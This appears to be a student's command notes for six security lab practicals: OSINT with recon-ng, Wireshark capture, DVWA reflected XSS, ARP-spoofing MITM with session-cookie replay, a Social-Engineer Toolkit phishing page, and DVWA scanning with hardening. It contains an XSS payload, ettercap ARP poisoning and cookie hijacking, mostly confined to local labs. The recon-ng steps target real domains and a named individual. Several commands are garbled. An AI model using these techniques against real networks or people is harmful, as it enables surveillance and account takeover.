Practical 01: Reconnaissance and OSINT Gathering
============================================================

-- Recording OS Information
cat /etc/os-release

uname -a

-- Updating Kali Package Index
sudo apt update

-- Installation of recon-ng package
sudo apt install -y recon-ng

-- Verifying recon-ng Installation
which recon-ng

-- Verifying Versions of Supporting Tools
sudo apt install -g python3 (if not installed, otherwise use: python3 -version)

-- Creating Directory to Record Observations/Findings
mkdir -p ~/Security-Attacks-Practical/Practical-01

cd ~/Security-Attacks-Practical/Practical-01

-- Starting Terminal Session Recording for Log-Analysis
script -a session-log.txt

-- Saving Installed-Tool Versions
echo "recon-ng Practical Environment" | tee -a tool-versions.txt

recon-ng -version | tee -a tool-versions.txt

cat /etc/os-release | head -n 2 | tee -a versions.txt

-- Launching recon-ng
recon-ng

-- Exploring the recon-ng help menu
help

-- Viewing the Module Search Operations
modules search

-- Installing all available marketplace modules
marketplace install all

-- Listing the workspaces
workspaces list

-- Creating a Dedicated Workspace
workspaces create security-breaches

-- Verifying Successful creation of Workspace
workspaces list

-- Installing whois_pocs Module from the Marketplace
marketplace install recon/domains-contracts/whois_pocs

-- Loading the whois_pocs Module
modules load recon/domains-contacts/whois_pocs

-- Selecting the Target Domain
options set SOURCE facebook.com

-- Running/Executing the Module
run

-- Observing the discovered Contacts
show contacts

-- Installation of the namechk Module
marketplace install recon/domains-communities/namechk (for older version)

marketplace install recon/profiles-profiles/namechki

-- Loading the Profile Module
modules load recon/domains-profiles/namechk

-- Setting the Target Name
options set SOURCE Brandon Stout

-- Running/Executing the Module
run

-- Inserting domain to perform our reconnaissance on (tesla and bmw)
db insert tesla.com | db insert bmw.com (NOTE: press enter if you want to keep the notes blank)

-- Verifying our inserted domains
show domains

-- Observing the Results
show profiles

-- Inserting a Target Domain into the Database (Domains)
db insert domains

-- Displaying the domains Table
show domains

-- Searching for Host-Enumeration Modules
modules search host

-- Loading the hackertarget module
modules load recon/domains-hosts/hackertarget

-- Setting the Source
options set SOURCE tesla.com

-- Running the Module
run

-- Observing the Discovered Hosts
show hosts

-- Querying the recon-ng Database
db query select * from domains

-- Loading the HTML Report Generator Module
modules load reporting-html

-- Viewing the Module Information
info

-- Setting the Creator Option
set CREATOR Arv

-- Setting the Customer Option
set CUSTOMER car world

-- Setting the Filename Option
set FILENAME /home/kali/Security-Attacks- Practicals/Practical-01/result.html

-- Running the Report Generator
run

-- Viewing the Report Generated
firefox-esr /home/kali/Security-Attacks-Practicals/Practical- 01/result.html

-- Exiting the recon-ng Framework
exit

-- Saving the Session Logs/Stopping the Script Recording
exit


Practical 02: Packet Sniffing and Protocol Analysis using Wireshark
============================================================

-- Check the current Kali Linux Version
cat /etc/os-release

-- Update the current existing packages
sudo apt update

-- running wireshark as root.
sudo dpkg-reconfigure wireshark-common

-- Verifying the current tool versions of Wireshark, tshark, and dumpcap
wireshark --version | head -n 3 tshark --version | head -n 3 dumpcap --version | head -n 3

-- Listing the Capture Interfaces
dumpcap -D

-- Creating the evidence directories
mkdir -p ~/security-labs/practical-03/{captures,www,tls,notes} cd ~/security-labs/practical-03 pwd

-- Verifying the successful creation of file
cat www/login.html

-- Checking whether the laboratory ports are available
ss -lntup | grep -E ':(8080|8443|9999)\b' || echo "Ports 8080,

-- Initially, starting wireshark as a normal user
wireshark &

-- Open a new Terminal and Run the following command
ping -c 4 127.0.0.1 Prior to Running this Command, Now double click on Loopback: lo to start packet capture Once the ping command is done, stop the Packet Capture by clicking on the 'Red Square' at the top bar of Wireshark Example

-- Starting the local HTTP Server
python3 -m http.server 8080 -bind 127.0.0.1 -directory www

-- Terminal and execute the following Command
curl -v "http://127.0.0.1:8080/login.html?username=student&password=LabDemo 123"

-- Initially, Start the netcat command
nc -u -l -p 127.0.0.1 9999

-- Open another Terminal and enter the command below
printf "UDP Message\n" | nc -u -w 127.0.0.1 9999

-- Execute the openssl Command
openssl req -x509 -newkey rsa:2048 -nodes -keyout lab.key -out lab.crt -days 1 -subj "/CN=localhost"

-- Verifying the files creation
ls -l lab.key lab.crt

-- Starting a local TLS Web Service
openssl s_server -quiet -accept 8443 -cert lab.crt -key lab.key - www

-- Starting a Wireshark Capture
tcp port 8443

-- Generating HTTPS Traffic
curl -k -v https://127.0.0.1:8443/

-- Stopping the Capture and Filtering it
tls

-- Listing the Capture Files
ls -lh capture/

-- Inspecting the Capture Metadata with capinfos
capinfos captures/http-cleartext-capture.pcapng

-- Extracting the HTTP Request fields with Tshark
tshark -r captures/http-cleartext-capture.pcapng -Y 'http.request' -T fields -e frame.number -e ip.src -e tcp.srcport -e http.request.method -e http.host -e http.request.uri

-- Creating SHA-256 Checksums
sha256sum captures/*.pcapng | tee notes/SHA256SUMS.txt

-- Starting a 15-second HTTP Capture
tshark -I lo -f 'tcp port 8080' -a duration:15 -w captures/http-cli- capture.pcapng

-- Reading the Captured Request
tshark -r captures/http-cli-capture.pcapng -Y http.request -T fields -e http.request.method -e http.host -e http.request.uri


Practical 03: Browser Injection Attacks
============================================================

-- Updating Packages
sudo apt update

-- Installing the Dependencies
sudo apt install -y docker.io docker-compose git curl firefox-esr

-- Enabling the Docker Service
sudo systemctl enable -now docker

-- Enabling the No Pager in Docker
sudo systemctl status docker --no-pager

-- Verifying the Versions
docker -version

docker-compose -version

firefox-esr -version

git -version

-- Creating Respective Folders and Navigating to it
mkdir -p ~/security-attacks/practical-05/{evidence,screenshots}

cd ~/security-attacks/practical-05

-- Verifying the current directory
pwd

-- Starting terminal-session recording
script -a evidence/terminal-session.txt

-- Saving Installed-Tool Versions
{ date docker -version docker compose -version firefox-esr - version git --version } | tee evidence/tool-versions.txt

-- Cloning the Supported DVWA Repository
git clone https://github.com/digininja/DVWA.git | cd DVWA

-- Recording the exact DVWA Revision
git rev-parse HEAD | tee ../evidence/dvwa-commit.txt

-- Confirming the safe local port binding
grep -n A2 "ports:" compose.yml

-- Pulling the Container Images
sudo docker compose pull

-- Starting the DVWA
sudo docker compose up -d

-- Checking the Container Status
sudo docker compose ps

-- Verifying the HTTP Reachability
curl -I http://127.0.0.1:4280/

-- Launching the Firefox ESR
firefox-esr http://127.0.0.1:4280/ >/dev/null 2>&1 &

-- Submitting harmless JavaScript payload
<script>alert('Reflected-XSS')</script>


Practical 04: MITM Traffic Interception and Cookie-Based Session Hijacking
============================================================

-- Recording OS Information
cat /etc/os-release | grep PRETTY_NAME

-- Updating Kali Package Index
sudo apt update

-- Installing the Assessment Tools
sudo DEBIAN_FRONTEND=noninteractive apt install -y \ nmap ettercap-text-only tshark curl openssl python3

-- Checking the Nmap Version
nmap --version | sed -n '1p'

-- Checking the Ettercap Version
ettercap -v

-- Checking the Tshark Version
tshark --version | sed -n '1p'

-- Checking the Python Version
python3 --version

-- only on this machine; nothing here touches the real network.
sudo ip netns add attacker

sudo ip netns add victim

sudo ip netns add server

-- Creating the Lab Bridge
sudo ip link add br-lab type bridge

sudo ip link set br-lab up

-- Creating the Virtual Ethernet Pairs
sudo ip link add veth-att type veth peer name att0

sudo ip link add veth-vic type veth peer name vic0

sudo ip link add veth-srv type veth peer name srv0

-- Moving Each Peer Interface into Its Namespace
sudo ip link set att0 netns attacker

sudo ip link set vic0 netns victim

sudo ip link set srv0 netns server

-- Attaching the Host-Side Interfaces to the Bridge
sudo ip link set veth-att master br-lab

sudo ip link set veth-vic master br-lab

sudo ip link set veth-srv master br-lab

-- Bringing the Bridge-Side Interfaces Up
sudo ip link set veth-att up

sudo ip link set veth-vic up

sudo ip link set veth-srv up

-- Configuring the Attacker Namespace
sudo ip netns exec attacker ip link set lo up

sudo ip netns exec attacker ip link set att0 up

sudo ip netns exec attacker ip addr add 10.10.20.10/24 dev att0

-- Configuring the Victim Namespace
sudo ip netns exec victim ip link set lo up

sudo ip netns exec victim ip link set vic0 up

sudo ip netns exec victim ip addr add 10.10.20.20/24 dev vic0

-- Configuring the Server Namespace
sudo ip netns exec server ip link set lo up

sudo ip netns exec server ip link set srv0 up

sudo ip netns exec server ip addr add 10.10.20.30/24 dev srv0

-- Verifying the Namespace Addresses
sudo ip netns exec attacker ip -br addr

sudo ip netns exec victim ip -br addr

sudo ip netns exec server ip -br addr

-- Testing Connectivity Inside the Lab
sudo ip netns exec victim ping -c 2 10.10.20.30

sudo ip netns exec attacker nmap -sn -n 10.10.20.20 10.10.20.30

-- session cookie on login and checks it on later requests.


-- Checking the Script Syntax
python3 -m py_compile session_lab_server.py

-- D.
sudo ip netns exec server python3 "$PWD/session_lab_server.py" \ --host 10.10.20.30 --port 8000

-- Logging In as the Victim
sudo ip netns exec victim curl -sS -D - -o /dev/null \ -c /tmp/victim.cookies \ -d 'username=student&password=lab123' \ http://10.10.20.30:8000/login -s

-- Accessing the Account Page with the Saved Cookie
sudo ip netns exec victim curl -sS -b /tmp/victim.cookies \ http://10.10.20.30:8000/account

-- LABSESSID value for the next step.
sudo cat /tmp/victim.cookies

-- value below with the one from the previous step.
sudo ip netns exec attacker curl -sS \ -H 'Cookie: LABSESSID=<value from victim.cookies>' \ http://10.10.20.30:8000/account

-- value is now rejected.
sudo ip netns exec victim curl -sS -b /tmp/victim.cookies \ http://10.10.20.30:8000/logout

sudo ip netns exec attacker curl -sS \ -H 'Cookie: LABSESSID=<same value as before>' \ http://10.10.20.30:8000/account

-- Open a new Terminal (3rd Terminal) and execute the command
sudo rm -f /tmp/session/session_http.pcap

-- (This ensure that the file does not exist in the system with any prior data)
sudo ip netns exec attacker ettercap -T -q -i att0 -M arp /10.10.20.20// /10.10.20.30// -w /tmp/session_http.pcap

-- Stop this activity
sudo ip netns exec victim curl -sS -b /tmp/victim.cookies http://10.10.20.30:8000/account

sudo tshark -r /tmp/session_http.pcap -Y 'http.set_cookie' -T fields - E header=y -e ip.src -e ip.dst -e http.request.uri -e http.cookie

cat /tmp/victim.cookies

-- Note down the session id
sudo ip netns exec attacker curl -sS -H 'Cookie: LABSESSID=<paste session id token> http://10.10.20.30:8000/account

sudo ip netns exec victim curl -sS -b /tmp/victim.cookies http://10.10.20.30:8000/logout

-- Verifying Log Out
sudo ip netns exec attacker curl -sS -H 'Cookie: LABSESSID=<paste session id token> http://10.10.20.30:8000/account

-- Creating the Certificates Folder
mkdir -p certs

-- Creating a Local Certificate Authority
openssl req -x509 -newkey rsa:2048 -nodes \ -keyout certs/lab_ca.key -out certs/lab_ca.crt \ -days 1 -sha256 -subj '/CN=Session Lab CA'

-- Creating the Server Key and Certificate Request
openssl req -newkey rsa:2048 -nodes \ -keyout certs/server.key -out certs/server.csr \ -subj '/CN=session.lab'

-- Writing the Certificate Extensions File
cat > certs/server.ext <<'EOF' subjectAltName=DNS:session.lab,IP:10.10.20.30 extendedKeyUsage=serverAuth EOF

-- Signing the Server Certificate with the Lab CA
openssl x509 -req -in certs/server.csr \ -CA certs/lab_ca.crt -CAkey certs/lab_ca.key -CAcreateserial \ -out certs/server.crt -days 1 -sha256 -extfile certs/server.ext

-- Verifying the Issued Certificate
openssl x509 -in certs/server.crt -noout \ -subject -issuer -ext subjectAltName

-- H.
sudo ip netns exec server python3 "$PWD/session_lab_server.py" \ --https --host 10.10.20.30 --port 8443 \ --cert "$PWD/certs/server.crt" --key "$PWD/certs/server.key"

-- Security header.
sudo ip netns exec victim curl -sS --cacert "$PWD/certs/lab_ca.crt" \ -D - -o /dev/null -c /tmp/victim_sec.cookies \ -d 'username=student&password=lab123' \ https://10.10.20.30:8443/login

-- Accessing the Account Page Over HTTPS
sudo ip netns exec victim curl -sS --cacert "$PWD/certs/lab_ca.crt" \ -b /tmp/victim_sec.cookies \ https://10.10.20.30:8443/account

-- http.cookie to see the cleartext cookie from Part F.
wireshark /tmp/session_http.pcap &

-- Removing the Network Namespaces and Bridge
sudo ip netns del attacker >/dev/null 2>&1 || true

sudo ip netns del victim >/dev/null 2>&1 || true

sudo ip netns del server >/dev/null 2>&1 || true

sudo ip link del br-lab >/dev/null 2>&1 || true

-- Removing the Captured Traffic and Cookie Files
sudo rm -f /tmp/session_http.pcap /tmp/session_https.pcap

sudo rm -f /tmp/victim.cookies /tmp/victim_sec.cookies

-- Removing the Certificate Files
sudo rm -rf certs

-- Confirming No Lab Namespaces Remain
ip netns list


Practical 05: Social Engineering ToolKit
============================================================

-- Recording OS Information
cat /etc/os-release | sed -n '1,6p'

-- Updating Kali Package Index
sudo apt update

-- Installing the Social-Engineer Toolkit
sudo apt install -y set

-- Recording the Installed Version
dpkg-query -W -f='${Package}\t${Version}\n' set

-- se-toolkit as an alternate name. Either path confirms the install.
command -v setoolkit

command -v se-toolkit

-- Creating the Lab Folders
mkdir -p ~/set-safe-lab

mkdir -p ~/set-safe-complete

-- values. It performs no submission to any external server.
cat > ~/set-safe-lab/index.html <<'HTMLEND' <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>SET Training Portal</title> <style> body {font-family: Arial, sans-serif; background:#eef1f4; margin:0;} .card {max-width:420px; margin:70px auto; background:#fff; padding:28px; border:1px solid #bbb; border-radius:10px;} h1 {font-size:24px; margin-top:0;} .warning {background:#fff3cd; padding:10px; border-radius:6px;} label {display:block; margin-top:14px;} input {width:100%; padding:10px; box-sizing:border-box;} button {margin-top:18px; width:100%; padding:11px;} </style> </head> <body> <div class="card"> <h1>Security Training Portal</h1> <p class="warning"><b>LAB ONLY:</b> Use dummy credentials. Never enter a real password.</p> <form action="index.html" method="post" autocomplete="off">

-- Writing the Completion Page
cat > ~/set-safe-complete/index.html <<'HTMLEND' <!doctype html> <html lang="en"> <head><meta charset="utf-8"><title>Training Complete</title></head> <body style="font-family:Arial;max-width:700px;margin:70px auto"> <h1>Training submission complete</h1> <p>This page is part of the isolated SET familiarization laboratory.</p> <p>No real account has been accessed.</p> </body> </html> HTMLEND

-- Confirming Both Files Were Created
ls -l ~/set-safe-lab/index.html ~/set-safe-complete/index.html

-- Leave this running in its own terminal tab.
python3 -m http.server 8081 --bind 127.0.0.1 --directory ~/set- safe-complete

-- Confirming the Server Responds
curl -I http://127.0.0.1:8081/

-- systemctl stop apache2
sudo ss -ltnp | grep ':80 ' || echo 'Port 80 is available'

-- E) Launching the Social-Engineer Toolkit
sudo setoolkit

-- Note: Press Y if prompted
set>1

set>2

set>3

set>3 (for selecting source of import)

-- Confirming the Lab Listeners are Stopped
sudo ss -ltnp | grep -E '(:80|:8081)' || echo 'Lab web listeners are stopped'

-- Removing the Training Files (if required)
rm -rf ~/set-safe-lab ~/set-safe-complete

-- Restarting Apache if it was Stopped Earlier
sudo systemctl start apache2


Practical 06: Vulnerability Assessment and Penetration Testing
============================================================

-- Updating Kali Package Index
sudo apt update

-- lightdm.service would end the desktop session.
sudo apt install -y docker.io docker-compose git nmap nikto curl

-- Enabling and Starting the Docker Service
sudo systemctl enable docker --now

-- Verifying the Docker Service is Running
sudo systemctl is-active docker

-- Checking the Docker Version
docker --version

-- Checking the Docker Compose Version
docker compose version

-- Checking the Nmap Version
nmap --version | head -n 1

-- Checking the Nikto Version
nikto -Version 2>/dev/null | head

-- Checking the curl Version
curl --version | head -n 1

-- Creating the Lab Directory
mkdir -p ~/vapt-lab

cd ~/vapt-lab

-- Confirming the Working Directory
pwd

-- Downloading DVWA from GitHub
git clone https://github.com/digininja/DVWA.git

cd DVWA

-- other host can reach it.
grep -A 2 -n "ports:" compose.yml

-- Starting the DVWA Containers
sudo docker compose up -d

-- seconds and run the command again.
sudo docker compose ps

-- Confirming the Listening Port
sudo ss -lntp | grep ':4280'

-- Moving to the Project Directory
cd ~/vapt-lab/DVWA

-- Creating the Evidence Folder
mkdir -p lab-evidence

-- Recording the Scope of Engagement
printf "Target: http://127.0.0.1:4280\nScope: loopback only\n" \ | tee lab-evidence/scope.txt

-- Capturing the Baseline HTTP Headers
curl -s -D lab-evidence/baseline_headers.txt \ -o /dev/null http://127.0.0.1:4280/

-- Viewing the Baseline Headers
cat lab-evidence/baseline_headers.txt

-- Service Discovery with Nmap
nmap -Pn -p 4280 \ --script http-title,http-headers \ 127.0.0.1 -oN lab-evidence/nmap_http.txt

-- to CIRT.net (y/n). This is optional; answering n keeps the lab fully local.
nikto -h http://127.0.0.1:4280 \ -output lab-evidence/nikto_before.txt \ -Format txt

-- Note: Press q to quit less.
less lab-evidence/nikto_before.txt

-- Inspecting the Login Page Response Headers
curl -s -D - -o /dev/null \ http://127.0.0.1:4280/login.php \ | grep -Ei '(HTTP/|X-Frame-Options|Content-Security-Policy)'

-- Checking Whether phpinfo.php is Reachable
curl -s -o /dev/null -w 'HTTP %{http_code}\n' \ http://127.0.0.1:4280/phpinfo.php

-- login page.
curl -s http://127.0.0.1:4280/phpinfo.php \ | grep -m 1 -i 'PHP Version' | sed 's/<[^>]*>//g'

-- ServerName message is only a warning.
sudo docker compose exec dvwa bash -c ' a2enmod headers >/dev/null && \ printf "%s\n" \ "<IfModule mod_headers.c>" \ "Header always set X-Frame-Options \"SAMEORIGIN\"" \ "Header always set X-Content-Type-Options \"nosniff\"" \ "Header always set Referrer-Policy \"no-referrer\"" \ "</IfModule>" \ > /etc/apache2/conf-available/vapt-hardening.conf && \ a2enconf vapt-hardening >/dev/null && \ apache2ctl configtest && \ apache2ctl -k graceful '

-- Disabling the phpinfo.php Page
sudo docker compose exec dvwa \ mv /var/www/html/phpinfo.php \ /var/www/html/phpinfo.php.lab-disabled

-- Re-checking the Security Headers
curl -s -D - -o /dev/null \ http://127.0.0.1:4280/login.php \ | grep -Ei '(HTTP/|X-Frame-Options|X-Content-Type-Options|Referrer- Policy)'

-- Re-checking phpi